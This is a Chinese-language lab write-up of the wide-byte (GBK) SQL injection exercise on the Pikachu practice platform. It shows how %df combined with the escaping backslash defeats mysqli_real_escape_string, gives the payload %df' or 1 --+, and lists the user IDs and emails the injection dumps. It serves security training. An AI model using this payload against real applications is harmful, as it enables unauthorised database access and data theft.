# Pikachu (wide byte注入)


### escape 過濾
```
$name = escape($link,$_POST['name']);

$query="select id,email from member where username='$name'";

```


### escape 被定義在\inc\mysql.inc.php


```
    function escape($link,$data){
    if(is_string($data)){
        return mysqli_real_escape_string($link,$data);
    }
    if(is_array($data)){
        foreach ($data as $key=>$val){
            $data[$key]=escape($link,$val);
        }
    }
    return $data;
}
```

### mysqli_real_escape_string
```

尽管 `mysqli_real_escape_string` 可以在一些情况下提供基本的防御，但它并不是一种绝对有效的防范宽字节注入的方法。宽字节注入是一种针对字符编码处理不当的漏洞攻击技术，而 `mysqli_real_escape_string` 并没有专门针对宽字节注入进行防御。

在宽字节注入攻击中，攻击者利用数据库字符编码不一致性来绕过字符串转义。即使使用了 `mysqli_real_escape_string`，如果应用程序在处理字符串时使用了错误的字符编码，仍然可能会受到宽字节注入的影响。


总之，宽字节注入是一种复杂的漏洞类型，仅仅依赖于 `mysqli_real_escape_string` 并不能完全防范。综合采用多种防御策略是更加安全和可靠的做法。
```



```
mysqli_real_escape_string(" '123 ")
``` 

單引號被轉譯，會輸出什麼
```
\'123
```

### 變成這樣注入不了
```
select id,email from member where username=' \'123 '
```




### 但是MySQL在使用GBK编码的时候 会认为两个字符为一个汉字


```
\'123

\ = %5c

%df 加上 %5c 會被解釋成漢字

%df%5c'123 

雖然可能沒有這個漢字，我們就假裝%df%5c = 漢

漢' or 1 --+


//還是被閉合了
select id,email from member where username='   漢' or 1 --+   '
```


```
%df' or 1 --+

爆出
<p class='notice'>your uid:1 <br />your email is: 1111111111111 </p>
<p class='notice'>your uid:2 <br />your email is: allen@pikachu.com </p>
<p class='notice'>your uid:3 <br />your email is: kobe@pikachu.com </p>
<p class='notice'>your uid:4 <br />your email is: grady@pikachu.com </p>
<p class='notice'>your uid:5 <br />your email is: kevin@pikachu.com </p>
<p class='notice'>your uid:6 <br />your email is: lucy@pikachu.com </p>
<p class='notice'>your uid:7 <br />your email is: lili@pikachu.com </p>
<p class='notice'>your uid:25 <br />your email is: </p>
<p class='notice'>your uid:27 <br />your email is: </p>
<p class='notice'>your uid:28 <br />your email is: </p>
<p class='notice'>your uid:29 <br />your email is: </p>
<p class='notice'>your uid:42 <br />your email is: 123 </p>
<p class='notice'>your uid:30 <br />your email is: 11111111 </p>
<p class='notice'>your uid:31 <br />your email is: 2222222222 </p>
<p class='notice'>your uid:32 <br />your email is: 111111 </p>
<p class='notice'>your uid:33 <br />your email is: 111111 </p>
<p class='notice'>your uid:34 <br />your email is: 111111 </p>
<p class='notice'>your uid:35 <br />your email is: 111111 </p>
<p class='notice'>your uid:36 <br />your email is: 111111 </p>
<p class='notice'>your uid:37 <br />your email is: 123 </p>
<p class='notice'>your uid:38 <br />your email is: 123 </p>
<p class='notice'>your uid:39 <br />your email is: 好 </p>
<p class='notice'>your uid:40 <br />your email is: 123 </p>
<p class='notice'>your uid:41 <br />your email is: </p>
<p class='notice'>your uid:43 <br />your email is: 5 </p>
<p class='notice'>your uid:44 <br />your email is: 123 </p>
<p class='notice'>your uid:45 <br />your email is: 123 </p>
<p class='notice'>your uid:46 <br />your email is: 123 </p>
```